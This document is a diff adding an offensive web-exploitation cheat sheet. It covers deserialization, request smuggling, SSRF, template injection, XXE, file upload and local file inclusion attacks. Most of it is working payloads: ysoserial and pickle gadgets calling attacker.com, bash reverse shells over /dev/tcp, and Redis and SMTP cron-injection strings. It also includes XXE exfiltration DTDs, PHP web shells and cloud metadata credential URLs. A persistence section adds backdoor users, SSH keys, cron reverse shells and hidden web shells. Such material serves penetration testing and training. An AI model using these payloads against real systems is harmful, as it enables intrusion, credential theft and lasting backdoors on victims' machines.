+# .NET: Check error messages
+System.Runtime.Serialization
+Newtonsoft.Json
+BinaryFormatter
+
+# Python: Check imports
+pickle
+PyYAML
+jsonpickle
+
+# PHP: Check phpinfo or errors
+serialize() / unserialize()
+__wakeup, __destruct in error messages
+```
+
+**Step 3: Generate Test Payload**
+
+```bash
+# Non-destructive callback test
+# Java
+java -jar ysoserial.jar CommonsCollections1 'nslookup $(whoami).attacker.com'
+
+# PHP
+phpggc Monolog/RCE1 system 'nslookup test.attacker.com'
+
+# Python
+import pickle, os
+class Test:
+    def __reduce__(self):
+        return (os.system, ('nslookup test.attacker.com',))
+pickle.dumps(Test())
+```
+
+**Step 4: Confirm Execution**
+
+```bash
+# Monitor DNS queries
+tcpdump -i any udp port 53
+python -m dnslib.server --log
+
+# HTTP callback listener
+python3 -m http.server 80
+nc -lvnp 80
+```
+
+**Step 5: Escalate to Shell**
+
+```bash
+# After confirming RCE, deploy reverse shell
+# Encode to avoid bad characters
+echo 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' | base64
+# Use in payload with base64 -d | bash
+```
+
+### Advanced Deserialization Techniques
+
+**Gadget Chain Construction**
+
+```bash
+# [Inference] Understanding gadget chains:
+# 1. Entry point: Magic method or auto-invoked function
+# 2. Chain links: Methods calling other methods
+# 3. Sink: Dangerous function (eval, system, exec)
+
+# Example Java gadget chain flow:
+# readObject() -> transform() -> invoke() -> Runtime.exec()
+```
+
+**Polymorphic Gadgets**
+
+```bash
+# Multiple exploitation paths in same application
+java -jar ysoserial.jar CommonsCollections1 'cmd'
+java -jar ysoserial.jar CommonsCollections2 'cmd'
+java -jar ysoserial.jar CommonsCollections5 'cmd'
+java -jar ysoserial.jar CommonsCollections6 'cmd'
+
+# Try different payload types if one fails
+```
+
+**Bypass Serialization Filters**
+
+```bash
+# Java: Look-ahead deserialization filters (JEP 290)
+# [Inference] Possible bypass approaches:
+# - Use allowed classes in unexpected ways
+# - Exploit filter implementation bugs
+# - Use gadgets from allowed libraries
+
+# Test with innocuous classes first
+java -jar ysoserial.jar CommonsBeanutils1 'cmd'  # Often whitelisted
+```
+
+**Compression/Encoding Chains**
+
+```bash
+# GZip compressed serialized object
+gzip payload.ser
+base64 payload.ser.gz
+
+# Nested encoding
+base64(gzip(serialize(payload)))
+
+# Hex encoding
+xxd -p payload.ser | tr -d '\n'
+```
+
+## Cross-Protocol Exploitation
+
+### HTTP Request Smuggling for RCE
+
+**CL.TE (Content-Length vs Transfer-Encoding) Smuggling**
+
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+```
+
+**TE.CL Smuggling**
+
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+```
+
+**Exploitation for Code Execution**
+
+```http
+# Smuggle request to internal admin endpoint
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 200
+Transfer-Encoding: chunked
+
+0
+
+POST /admin/exec HTTP/1.1
+Host: internal-admin.local
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+cmd=whoami
+```
+
+### Server-Side Request Forgery (SSRF) to RCE
+
+**Cloud Metadata Exploitation**
+
+```bash
+# AWS metadata
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+
+# Google Cloud
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/user-data
+```
+
+**Internal Service Exploitation**
+
+```bash
+# Redis exploitation
+# URL encode CRLF for protocol smuggling
+http://vulnerable.com/fetch?url=http://localhost:6379/%0D%0A*1%0D%0A$8%0D%0Aflushall%0D%0A*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$64%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/<IP>/<PORT> 0>&1%0A%0A%0A%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$16%0D%0A/var/spool/cron/%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$4%0D%0Aroot%0D%0A*1%0D%0A$4%0D%0Asave%0D%0A
+
+# Memcached exploitation
+gopher://localhost:11211/_%0d%0aset%20exploit%200%200%20100%0d%0a<?php system($_GET['cmd']); ?>%0d%0a
+
+# FastCGI exploitation
+gopher://localhost:9000/...fastcgi_payload...
+
+# SMTP exploitation for command execution
+http://vulnerable.com/fetch?url=smtp://localhost:25/%0AHELO%20test%0AMAIL%20FROM:attacker@evil.com%0ARCPT%20TO:root@localhost%0ADATA%0ASubject:exploit%0A%0A*/1 * * * * bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'%0A.%0AQUIT
+```
+
+**SSRF with Protocol Wrappers**
+
+```bash
+# File protocol
+file:///etc/passwd
+file:///proc/self/environ
+file:///var/www/html/config.php
+
+# PHP wrappers (if processing as PHP)
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://input  # POST data
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+
+# Expect wrapper (if enabled)
+expect://whoami
+
+# Gopher for multi-protocol
+gopher://localhost:25/_MAIL%20FROM...
+```
+
+**SSRF Bypass Techniques**
+
+```bash
+# Localhost bypass
+http://127.0.0.1
+http://0.0.0.0
+http://localhost
+http://[::1]
+http://127.1
+http://0177.0.0.1  # Octal
+http://0x7f.0x0.0x0.0x1  # Hex
+http://2130706433  # Decimal
+http://127.0.0.1.nip.io
+http://spoofed.burpcollaborator.net  # DNS rebinding
+
+# DNS rebinding
+# Point domain to public IP first, then change to 127.0.0.1
+
+# URL parser confusion
+http://attacker.com@127.0.0.1
+http://127.0.0.1#@attacker.com
+http://attacker.com#127.0.0.1
+
+# CRLF injection
+http://attacker.com%0d%0aSet-Cookie:%20admin=true
+
+# Unicode/encoding bypass
+http://①②⑦.⓪.⓪.①  # Unicode numbers
+http://127.0.0。1  # Alternate dot characters
+```
+
+### Template Injection to RCE
+
+**Server-Side Template Injection (SSTI) Detection**
+
+```bash
+# Polyglot payload for detection
+${{<%[%'"}}%\.
+
+# Math operations
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+*{7*7}
+```
+
+**Jinja2 (Python) SSTI**
+
+```python
+# Basic RCE
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+
+# Alternative methods
+{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}
+
+# File read
+{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+
+# Reverse shell
+{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read()}}
+
+# Bypass filters
+{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
+{{lipsum.__globals__.os.popen('whoami').read()}}
+{{cycler.__init__.__globals__.os.popen('whoami').read()}}
+```
+
+**Twig (PHP) SSTI**
+
+```php
+# Basic RCE
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+
+# Alternative
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+
+# File read
+{{'/etc/passwd'|file_excerpt(1,30)}}
+
+# Reverse shell
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'")}}
+```
+
+**FreeMarker (Java) SSTI**
+
+```java
+# RCE via execute
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }
+
+# ObjectConstructor
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","whoami").start()}
+
+# API built-in
+${"freemarker.template.utility.Execute"?new()("whoami")}
+```
+
+**Velocity (Java) SSTI**
+
+```java
+# Basic RCE
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
+
+# Alternative
+#set($s="")
+$s.class.forName("java.lang.Runtime").getRuntime().exec("whoami")
+```
+
+**ERB (Ruby) SSTI**
+
+```ruby
+# Basic RCE
+<%= system("whoami") %>
+<%= `whoami` %>
+<%= IO.popen("whoami").readlines() %>
+
+# Reverse shell
+<%= system("bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'") %>
+
+# File read
+<%= File.open('/etc/passwd').read %>
+```
+
+**Smarty (PHP) SSTI**
+
+```php
+# RCE via {php} tags (if enabled)
+{php}system("whoami");{/php}
+
+# Static method call
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('whoami'); ?>",self::clearConfig())}
+
+# Function call
+{system('whoami')}
+```
+
+**Thymeleaf (Java) SSTI**
+
+```java
+# Expression objects
+${T(java.lang.Runtime).getRuntime().exec('whoami')}
+
+# Spring expression
+__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}__::.x
+
+# Request parameter
+__${T(java.lang.Runtime).getRuntime().exec(param.cmd)}__::.x
+```
+
+**Pug/Jade (Node.js) SSTI**
+
+```javascript
+# Basic RCE
+#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('whoami')}()}
+
+# Alternative
+#{global.process.mainModule.require('child_process').execSync('whoami')}
+
+# Reverse shell
+#{global.process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"')}
+```
+
+**Tornado (Python) SSTI**
+
+```python
+# Handler access
+{% import os %}{{os.system('whoami')}}
+
+# Alternative
+{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}
+```
+
+### Testing Workflow for SSTI
+
+**1. Identify Template Engine**
+
+```bash
+# Trigger errors to reveal engine
+{{7*'7'}}  # Jinja2: 7777777, Twig: 49
+${7*'7'}   # Different behavior per engine
+
+# Check error messages
+TemplateSyntaxError  # Jinja2/Django
+Twig_Error           # Twig
+FreeMarker error     # FreeMarker
+```
+
+**2. Map Available Objects**
+
+```python
+# Jinja2 example
+{{config}}
+{{request}}
+{{lipsum}}
+{{cycler}}
+{{joiner}}
+{{namespace}}
+```
+
+**3. Find Path to Dangerous Functions**
+
+```python
+# Enumerate subclasses
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# Find useful classes
+{% for x in ''.__class__.__mro__[1].__subclasses__() %}
+  {% if "Popen" in x.__name__ %}
+    {{loop.index0}}
+  {% endif %}
+{% endfor %}
+```
+
+**4. Construct RCE Payload**
+
+```python
+# Use discovered index
+{{''.__class__.__mro__[1].__subclasses__()[INDEX]('whoami',shell=True,stdout=-1).communicate()}}
+```
+
+**5. Establish Reverse Shell**
+
+```python
+# Final payload
+{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read()}}
+```
+
+## XML External Entity (XXE) Injection to RCE
+
+### Basic XXE Detection
+
+**Out-of-Band XXE**
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
+]>
+<data>&xxe;</data>
+```
+
+**File Disclosure XXE**
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&xxe;</data>
+```
+
+**Blind XXE with Parameter Entities**
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
+%xxe;
+]>
+```
+
+**External DTD for Data Exfiltration**
+
+```xml
+# On attacker server (xxe.dtd):
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+%eval;
+%exfil;
+
+# Trigger from victim:
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
+%xxe;
+]>
+```
+
+### XXE to Remote Code Execution
+
+**PHP expect:// Wrapper**
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "expect://whoami">
+]>
+<data>&xxe;</data>
+
+# Reverse shell
+<!ENTITY xxe SYSTEM "expect://bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'">
+```
+
+**Java XXE to RCE via jar: Protocol**
+
+```xml
+# Upload malicious JAR, then:
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/Evil.class">
+]>
+```
+
+**XXE with File Upload**
+
+```xml
+# 1. Upload PHP shell via XXE
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-decode/resource=/var/www/html/shell.php">
+]>
+<data>BASE64_ENCODED_PHP_SHELL</data>
+
+# 2. Access uploaded shell
+curl http://target.com/shell.php?cmd=whoami
+```
+
+**SSRF via XXE to Internal Services**
+
+```xml
+# Access internal admin panel
+<!ENTITY xxe SYSTEM "http://localhost/admin/exec?cmd=whoami">
+
+# Redis exploitation
+<!ENTITY xxe SYSTEM "http://localhost:6379/%0D%0A*1%0D%0A$8%0D%0Aflushall%0D%0A*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$64%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/<IP>/<PORT> 0>&1%0A%0A%0A">
+```
+
+### XXE in Different Contexts
+
+**SOAP Web Services**
+
+```xml
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soap:Body>
+  <data>&xxe;</data>
+</soap:Body>
+</soap:Envelope>
+```
+
+**SVG File Upload**
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [
+<!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+  <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+```
+
+**DOCX/XLSX File Upload**
+
+```bash
+# Unzip Office document
+unzip document.docx -d extracted
+
+# Edit extracted/word/document.xml
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://attacker.com/callback">
+]>
+
+# Rezip
+cd extracted
+zip -r ../malicious.docx *
+```
+
+**RSS/Atom Feeds**
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE rss [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<rss version="2.0">
+  <channel>
+    <title>Test</title>
+    <description>&xxe;</description>
+  </channel>
+</rss>
+```
+
+## Post-Exploitation Considerations
+
+**Maintain Access After Initial RCE**
+
+```bash
+# Add SSH key
+mkdir -p ~/.ssh
+echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+# Create backdoor user
+useradd -m -s /bin/bash backdoor
+echo 'backdoor:password' | chpasswd
+usermod -aG sudo backdoor
+
+# Cron persistence
+echo '*/5 * * * * bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' | crontab -
+
+# Web shell backdoor
+echo '<?php system($_GET["c"]); ?>' > /var/www/html/.config.php
+```
+
+**Privilege Escalation After RCE**
+
+```bash
+# Run automated enumeration
+wget http://attacker.com/linpeas.sh
+bash linpeas.sh
+
+# Check for quick wins
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+cat /etc/crontab
+```
+
+## Important Subtopics
+
+**Web Application Firewall (WAF) Bypass Techniques** - encoding, chunking, and evasion methods for bypassing filtering **API Security Testing** - REST/GraphQL injection and exploitation patterns **WebSocket Exploitation** - injection and hijacking in real-time protocols **Container Escape Techniques** - exploitation leading to host system access from containerized applications
+
+---
+
+## File Upload Vulnerabilities
+
+File upload vulnerabilities enable arbitrary code execution, data exfiltration, or system compromise when applications lack proper validation, storage isolation, or execution prevention mechanisms.
+
+**Upload Point Identification**
+
+Discover file upload functionality during reconnaissance:
+
+```bash
+nmap -sV --script http-enum <target>
+nmap -sV --script http-form-brute <target>
+burp suite (manual inspection of forms)
+```
+
+Identify upload forms through manual browsing, directory enumeration, or application spidering. Common upload endpoints:
+
+- `/upload`, `/file-upload`, `/media/upload`
+- `/user/avatar`, `/profile/picture`
+- `/document/submit`, `/resume/upload`
+- `/import`, `/batch-process`
+- API endpoints: `/api/upload`, `/api/files`, `/api/media`
+
+Examine HTML source for hidden upload fields:
+
+```html
+<input type="file" name="uploadfile" accept=".pdf,.doc" />
+```
+
+Analyze form attributes (enctype, method, action) and JavaScript validation for bypass opportunities.
+
+**MIME Type Validation Bypass**
+
+Applications frequently validate file types through MIME type checking, which is client-controllable and server-bypassable.
+
+Modify Content-Type header in HTTP requests:
+
+```
+POST /upload HTTP/1.1
+Host: target.local
+Content-Type: multipart/form-data; boundary=----FormBoundary
+
+------FormBoundary
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/jpeg
+
+<?php system($_GET['cmd']); ?>
+------FormBoundary--
+```
+
+Tools for automated bypasses:
+
+```bash
+burp repeater (manual Content-Type modification)
+curl -F "file=@shell.php;type=image/jpeg" http://target/upload.php
+```
+
+Craft polyglot files containing valid file signatures combined with executable code:
+
+```bash
+# Create JPEG with embedded PHP
+printf '\xFF\xD8\xFF\xE0' > shell.jpg  # JPEG header
+echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
+```
+
+[Inference] File type validation bypasses rely on server-side verification not properly checking file contents beyond MIME type headers, though robust implementations verify file magic bytes and internal structure regardless of client-provided MIME information.
+
+**File Extension Filtering Bypass**
+
+Extensions-based filtering can be circumvented through alternative executable extensions or case manipulation.
+
+Common bypass techniques:
+
+```
+shell.php → shell.php5, shell.php7, shell.phtml, shell.pht, shell.shtml
+shell.jsp → shell.jspx, shell.war
+shell.asp → shell.aspx, shell.cer, shell.asa
+shell.exe → shell.com, shell.scr, shell.bat, shell.cmd, shell.ps1
+```
+
+Case sensitivity exploitation (filesystem-dependent):
+
+```
+shell.pHp (Windows, case-insensitive filesystems)
+shell.PHP (lowercase filters)
+```
+
+Double extension attacks (web server configuration-dependent):
+
+```
+shell.php.jpg (Apache with AddType php .jpg configuration)
+shell.jpg.php (vulnerable configurations treating rightmost extension)
+```
+
+Null byte injection (deprecated in modern PHP):
+
+```
+shell.php%00.jpg (interpreted as shell.php in PHP < 5.3)
+```
+
+[Unverified] Null byte injection is patched in modern PHP versions though remains [Inference] exploitable in legacy applications where disabled PHP strict mode or older web server configurations may process the null byte incorrectly.
+
+**Archive-Based Upload Exploitation**
+
+Applications processing uploaded archives (ZIP, TAR, RAR) may extract contents without proper path sanitization.
+
+Create malicious archives with path traversal:
+
+```bash
+mkdir exploit
+echo '<?php system($_GET["cmd"]); ?>' > exploit/shell.php
+cd exploit
+zip -r ../malicious.zip .
+# Alternatively, manual archive manipulation
+unzip -l malicious.zip
+# Output: exploit/shell.php
+
+# Create archive with traversal path
+mkdir -p "../../var/www/html"
+echo '<?php system($_GET["cmd"]); ?>' > "../../var/www/html/shell.php"
+zip -r traversal.zip .
+```
+
+[Inference] Path traversal in archive extraction enables arbitrary file placement outside intended upload directories when extraction routines don't validate member paths against directory traversal sequences, though modern libraries (ZipArchive, Python zipfile) default-restrict extraction to base directories.
+
+**Image File Upload with Embedded Code**
+
+Image upload restrictions can be bypassed by embedding executable code within valid image files.
+
+Append PHP to valid image:
+
+```bash
+cat image.jpg shell.php > combined.jpg
+```
+
+Use specialized tools for polyglot generation:
+
+```bash
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
+identify combined.jpg  # Verify image validity
+```
+
+Exploit image processing libraries:
+
+```bash
+# ImageMagick ImageTragick (CVE-2016-3714)
+convert 'https://example.com/image.jpg[0]|whoami' output.jpg
+```
+
+[Unverified] Image processing library vulnerabilities like ImageTragick enable command injection through specially crafted image files processed by vulnerable ImageMagick versions, though exploitation depends on specific library version and processing operations applied.
+
+**Upload Location and Execution Analysis**
+
+Determine upload destination and execution context:
+
+```bash
+# After uploading test file
+find /var/www -name "test_uploaded_file.txt" -mmin -5
+ls -la /var/www/uploads/
+cat /var/www/uploads/test_uploaded_file.txt
+```
+
+Analyze web server configuration for upload directory:
+
+```bash
+cat /etc/apache2/sites-available/default
+cat /etc/nginx/sites-available/default
+```
+
+[Inference] Uploaded files stored in web-accessible directories with executable permissions enable direct code execution through HTTP requests, while uploads outside web root or in directories without execute permissions require alternative exploitation (local file inclusion, application processing).
+
+**Race Condition Exploitation**
+
+Upload files rapidly before server-side validation or deletion:
+
+```bash
+#!/bin/bash
+for i in {1..1000}; do
+    curl -F "file=@shell.php" http://target/upload.php &
+done
+wait
+```
+
+[Unverified] Upload race conditions exist in applications validating files after writing to disk, creating a window where unvalidated files are temporarily accessible before deletion or quarantine, though exploitation window is typically microseconds to milliseconds making practical exploitation difficult.
+
+**Zip Slip and Archive Traversal**
+
+Craft malicious ZIP files exploiting extraction path traversal:
+
+```bash
+# Create nested structure
+mkdir -p "../../../tmp/web"
+echo '<?php system($_GET["cmd"]); ?>' > "../../../tmp/web/shell.php"
+# Using zipme or manual creation
+python3 << 'EOF'
+import zipfile
+z = zipfile.ZipFile('malicious.zip', 'w')
+z.writestr('../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
+z.close()
+EOF
+```
+
+[Inference] Zip Slip exploits occur when archive extraction routines fail to validate or sanitize member paths containing `../` sequences, enabling arbitrary file placement outside the intended extraction directory, though modern implementations validate member paths and refuse extraction when traversal sequences are detected.
+
+**Upload Filename Manipulation**
+
+Applications may process filenames without proper sanitization:
+
+```
+filename: shell.php??.jpg (processed as shell.php in some contexts)
+filename: shell.php....jpg (trailing dots removed on Windows)
+filename: shell.php%20 (trailing space removed)
+filename: shell.php::$DATA (NTFS alternate data stream, Windows-specific)
+```
+
+Command injection through filenames:
+
+```
+filename: shell.php;id.jpg
+filename: shell.php`whoami`.jpg
+filename: shell.php$(id).jpg
+```
+
+[Unverified] Filename-based exploitation depends on specific backend processing—scripting language interpretation, shell command invocation, or file system interactions—making exploitation highly context-dependent.
+
+**Upload Functionality Fuzzing**
+
+Systematically test upload restrictions:
+
+```bash
+wfuzz -c -z file,wordlist.txt -z range,1-100 -X POST -b "COOKIE" -d "file=FUZZ" http://target/upload.php
+# Or manual testing with various payloads
+for ext in php php3 php4 php5 php7 phtml shtml; do
+    echo "<?php system(\$_GET['cmd']); ?>" > "shell.$ext"
+    curl -F "file=@shell.$ext" http://target/upload.php
+done
+```
+
+---
+
+## Local File Inclusion (LFI)
+
+Local File Inclusion vulnerabilities enable arbitrary file disclosure, information gathering, and code execution when applications dynamically include files based on user input without proper validation.
+
+**LFI Vulnerability Identification**
+
+Identify inclusion points through parameter analysis:
+
+```bash
+# URL parameter testing
+http://target/page.php?file=about
+http://target/page.php?page=home
+http://target/view.php?document=report
+http://target/index.php?lang=en
+http://target/content.php?section=news
+```
+
+Burp Suite parameter discovery:
+
+```
+- Crawl application recording all parameters
+- Search for parameters with names suggesting file operations: page, file, include, view, content, section, lang, document
+- Test each parameter for directory traversal and inclusion patterns
+```
+
+**Basic Directory Traversal**
+
+Attempt to access files outside intended directories:
+
+```
+http://target/page.php?file=../../../etc/passwd
+http://target/page.php?file=../../windows/win.ini
+http://target/page.php?file=/etc/passwd
+http://target/page.php?file=../../../../etc/shadow
+```
+
+Traverse using encoded sequences:
+
+```
+..%2F..%2F..%2Fetc%2Fpasswd
+..%252F..%252F..%252Fetc%252Fpasswd (double URL encoding)
+....//....//....//etc/passwd
+..\..\..\..\windows\win.ini (Windows backslash)
+```
+
+**Null Byte Truncation (Legacy)**
+
+Exploit null byte handling in older PHP versions:
+
+```
+http://target/page.php?file=../../../etc/passwd%00
+http://target/page.php?file=../../../etc/passwd%00.jpg
+```
+
+[Unverified] Null byte truncation was a common LFI exploitation vector in PHP < 5.3 where the null byte (`%00`) truncated string processing, causing `.jpg` suffix validation to be ignored when null bytes were processed as string terminators, though this vulnerability is patched in modern PHP versions and contemporary systems.
+
+**Absolute Path Inclusion**
+
+Use absolute paths bypassing relative path filtering:
+
+```
+http://target/page.php?file=/etc/passwd
+http://target/page.php?file=/var/www/html/config.php
+http://target/page.php?file=/proc/self/environ
+```
+
+Analyze application behavior with absolute paths to identify [Inference] whether input validation restricts only relative paths or implements comprehensive path filtering, though robust implementations validate all paths regardless of absolute/relative nature.
+
+**Log File Inclusion**
+
+Access application and system logs for credential disclosure or code execution:
+
+```
+http://target/page.php?file=../../../var/log/apache2/access.log
+http://target/page.php?file=../../../var/log/nginx/access.log
+http://target/page.php?file=../../../var/log/auth.log
+http://target/page.php?file=../../../windows/system32/drivers/etc/hosts
+```
+
+Logs may contain [Inference] user-supplied data (User-Agent, referrer) embedded in log entries, enabling log file poisoning combined with inclusion for code execution when logs are included.
+
+**Log File Poisoning for Code Execution**
+
+Inject code into accessible logs:
+
+```bash
+# HTTP User-Agent injection
+curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target/
+
+# Apache access log inclusion
+http://target/page.php?file=../../../var/log/apache2/access.log
+```
+
+Request the poisoned log through LFI:
+
+```
+http://target/page.php?file=../../../var/log/apache2/access.log&cmd=id
+```
+
+[Inference] Log file inclusion with code injection enables arbitrary code execution under web server user privileges when included files are processed as PHP or other executable types, though exploitation requires the inclusion point to process file contents as code rather than displaying raw content.
+
+**Proc Filesystem Enumeration (Linux)**
+
+Access process information through `/proc`:
+
+```
+http://target/page.php?file=/proc/self/environ
+http://target/page.php?file=/proc/self/cmdline
+http://target/page.php?file=/proc/[pid]/maps
+http://target/page.php?file=/proc/net/tcp
+http://target/page.php?file=/proc/version
+```
+
+`/proc/self/environ` reveals [Inference] environment variables (PATH, HOME, USER, database credentials) passed to the web application process, while `/proc/net/tcp` enumerates established network connections potentially revealing backend database/cache connections.
+
+**Configuration File Disclosure**
+
+Target application and system configuration files:
+
+```
+http://target/page.php?file=../../../etc/apache2/apache2.conf
+http://target/page.php?file=../../../etc/mysql/my.cnf
+http://target/page.php?file=../../../etc/postgresql/postgresql.conf
+http://target/page.php?file=../../../windows/system32/config/sam
+http://target/page.php?file=../../../windows/win.ini
+```
+
+Application-specific configurations:
+
+```
+http://target/page.php?file=config.php
+http://target/page.php?file=../config.php
+http://target/page.php?file=../database.yml
+http://target/page.php?file=../../settings.json
+```
+
+Configuration files frequently contain [Inference] database credentials, API keys, service account credentials, or encryption keys enabling further system compromise beyond initial information disclosure.
+
+**PHP Wrapper Exploitation**
+
+Use PHP stream wrappers for code execution and file manipulation:
+
+```
+http://target/page.php?file=php://filter/convert.base64-encode/resource=index.php
+http://target/page.php?file=php://filter/convert.base64-encode/resource=config.php
+```
+
+The `convert.base64-encode` filter encodes file contents enabling retrieval of PHP files without direct execution. Base64-decode retrieved content:
+
+```bash
+echo "PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsgPz4=" | base64 -d
+```
+
+PHP data wrapper for code execution:
+
+```
+http://target/page.php?file=data:text/plain,<?php system($_GET['cmd']); ?>
+http://target/page.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+```
+
+[Unverified] Data wrapper exploitation requires `allow_url_include` directive enabled in PHP configuration (default disabled in modern PHP), and execution depends on whether included content is processed as code or displayed as text.
+
+**Remote Inclusion with Wrappers**
+
+Combine local inclusion with remote content:
+
+```
+http://target/page.php?file=expect://whoami
+http://target/page.php?file=input://POST
+http://target/page.php?file=/dev/stdin (when combined with POST data)
+```
+
+[Inference] Expect wrapper enables arbitrary command execution on systems with `expect://` protocol support, though this requires PHP compiled with expect support (uncommon in modern deployments).
+
+**LFI to RCE via Session Files**
+
+Access PHP session files containing user-controlled data:
+
+```bash
+# Identify session file location
+http://target/page.php?file=/var/lib/php/sessions/sess_[SESSIONID]
+http://target/page.php?file=/tmp/sess_[SESSIONID]
+```
+
+Session files contain [Inference] serialized PHP objects and user data, enabling code injection when sessions store user-supplied input (username, profile data) without sanitization and the inclusion point deserializes session data.
+
+Create malicious session data:
+
+```php
+<?php
+$_SESSION['username'] = '<?php system($_GET["cmd"]); ?>';
+?>
+```
+
+Request through LFI:
+
+```
+http://target/page.php?file=/tmp/sess_SESSIONID
+```
+
+[Unverified] Session-based RCE exploitation depends on session data storage format (PHP serialization, JSON), deserialization behavior, and whether included content is processed as code.
+
+**Compression Wrapper Exploitation**
+
+Access compressed files through wrapper filters:
+
+```
+http://target/page.php?file=compress.zlib://archive.zip
+http://target/page.php?file=compress.bzip2://file.bz2
+```
+
+[Unverified] Compression wrappers enable extraction and reading of compressed archives through inclusion mechanisms, though exploitation requires the specific compression wrapper to be enabled in PHP configuration.
+
+**LFI Filter Chain Construction**
+
+Chain multiple filters for bypass and execution:
+
+```
+http://target/page.php?file=php://filter/convert.base64-encode/convert.base64-encode/resource=index.php
+```
+
+Analyze LFI filter usage patterns:
+
+```bash
+# Test filter application
+http://target/page.php?file=php://filter/string.rot13/resource=index.php
+```
+
